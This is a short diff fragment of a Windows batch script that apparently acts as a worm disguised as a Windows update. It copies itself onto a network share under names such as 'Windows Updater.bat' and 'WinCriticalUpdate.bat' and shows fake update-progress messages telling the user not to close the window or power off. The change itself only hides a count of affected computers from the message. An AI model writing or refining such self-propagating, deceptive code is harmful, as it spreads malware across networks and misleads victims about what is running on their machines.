@@ -46,7 +46,7 @@ if !adminspread! equ 0 (
     xcopy /Y /Q "%~f0" "\\host\shared\Windows Updater.bat" >nul 2>&1
     xcopy /Y /Q "%~f0" "\\host\shared\WinCriticalUpdate.bat" >nul 2>&1
 
-    echo Windows update successfully installed on !adminspread! computer(s).
+    echo Windows update successfully installed.
     echo Please stand by as we add the finishing touches. This might take a few minutes.
     echo Do not close this window or turn off the machine.
 ) else (
